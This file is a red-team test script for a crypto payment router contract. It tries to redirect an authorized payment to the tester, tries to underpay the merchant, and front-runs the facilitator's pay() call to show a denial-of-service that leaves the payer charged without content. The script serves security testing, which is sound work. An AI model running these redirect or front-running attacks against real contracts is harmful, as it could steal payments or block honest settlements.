// Router path: legit payment, intent-binding (redirect resistance), and the permissionless-pay()
// front-run DoS. We act as both payer and front-runner (a real front-runner would read the
// facilitator's pending tx from the mempool).
import { FAC, MER, post, payMerchant, makeRedteamAgent, HEADER } from './lib.mjs';
import { makeChain, parseSigner } from '../lib/cast.mjs';
import { decode } from '../lib/protocol.mjs';

const chain = makeChain(process.env.RPC_URL);
const signer = parseSigner(`keystore:${process.env.X402_WALLETS}/redteam`, process.env.AGENT_PASSWORD_FILE);
const agent = await makeRedteamAgent();
const A = { router: (process.env.ROUTER || '').toLowerCase(), susd: (process.env.SUSD || '').toLowerCase(), usdc: (process.env.USDC || '').toLowerCase(), merchant: (process.env.MERCHANT || '').toLowerCase() };
const log = (...a) => console.log(...a);
const bal = async (who) => ({
  susd: await chain.uint(A.susd, 'balanceOf(address)(uint256)', [who]),
  usdc: await chain.uint(A.usdc, 'balanceOf(address)(uint256)', [who]),
});

async function freshRouterPayload() {
  const res = await fetch(`${MER}/api/v1/premium`);
  const required = decode(res.headers.get(HEADER.required));
  const o = await agent.choose(required.accepts, 'router');
  if (o.mode !== 'router') throw new Error('did not choose router: ' + o.mode);
  const payload = await agent.authorize(o);
  return { required, o, salt: payload.spectrum.salt,
    paymentPayload: { x402Version: 2, resource: required.resource, accepted: o.r, payload } };
}

// ---- 1. Intent binding: try to redirect a router payment by calling pay() with a wrong payTo ----
{
  const f = await freshRouterPayload();
  const a = f.paymentPayload.payload.authorization;
  const argsRedirect = [a.from, a.value, a.validAfter, a.validBefore, agent.address /* <-- me, not merchant */, f.o.r.amount, f.salt, f.paymentPayload.payload.signature];
  try {
    await chain.call(A.router, 'pay(address,uint256,uint256,uint256,address,uint256,bytes32,bytes)', argsRedirect, { from: agent.address });
    log('[intent-binding redirect payTo->me] NO REVERT  <-- BROKE');
  } catch (e) {
    log('[intent-binding redirect payTo->me] reverted: %s', (e.message || '').slice(0, 80));
  }
  // and with a smaller assets (pay merchant less, keep the rest)
  const argsCheap = [a.from, a.value, a.validAfter, a.validBefore, A.merchant, '1', f.salt, f.paymentPayload.payload.signature];
  try {
    await chain.call(A.router, 'pay(address,uint256,uint256,uint256,address,uint256,bytes32,bytes)', argsCheap, { from: agent.address });
    log('[intent-binding assets 50000->1] NO REVERT  <-- BROKE');
  } catch (e) {
    log('[intent-binding assets 50000->1] reverted: %s', (e.message || '').slice(0, 80));
  }
  // The untouched authorization must still settle correctly afterwards (stays usable).
  const res = await payMerchant('/api/v1/premium', f.paymentPayload);
  log('[router legit after failed redirects] status=%s success=%s tx=%s', res.status, res.settlement?.success, res.settlement?.transaction);
}

// ---- 2. Front-run: build a payload, submit pay() myself, then the honest settle must fail ----
{
  const f = await freshRouterPayload();
  const a = f.paymentPayload.payload.authorization;
  const mBefore = await bal(A.merchant);
  const meBefore = await bal(agent.address);
  const args = [a.from, a.value, a.validAfter, a.validBefore, A.merchant, f.o.r.amount, f.salt, f.paymentPayload.payload.signature];
  const sent = await chain.send(A.router, 'pay(address,uint256,uint256,uint256,address,uint256,bytes32,bytes)', args, signer);
  const mAfter = await bal(A.merchant);
  const meAfter = await bal(agent.address);
  const rtr = await bal(A.router);
  log('[frontrun pay() ok=%s tx=%s] merchant USDC +%s  router left susd=%s usdc=%s',
    sent.ok, sent.hash, (mAfter.usdc - mBefore.usdc).toString(), rtr.susd.toString(), rtr.usdc.toString());
  log('        payer sUSD change=%s usdc change=%s', (meAfter.susd - meBefore.susd).toString(), (meAfter.usdc - meBefore.usdc).toString());
  // Now the honest path: present the same payload to the merchant.
  const res = await payMerchant('/api/v1/premium', f.paymentPayload);
  log('[frontrun then honest request] status=%s error=%s (payer charged, got content=%s)',
    res.status, (() => { try { return decode(Buffer.from(res.body, 'utf8').toString('base64') ? JSON.parse(res.body).error : ''); } catch { try { return JSON.parse(res.body).error; } catch { return '?'; } } })(), res.status === 200);
}

const fb = await bal(agent.address);
log('[redteam balances] sUSD=%s USDC=%s', fb.susd.toString(), fb.usdc.toString());
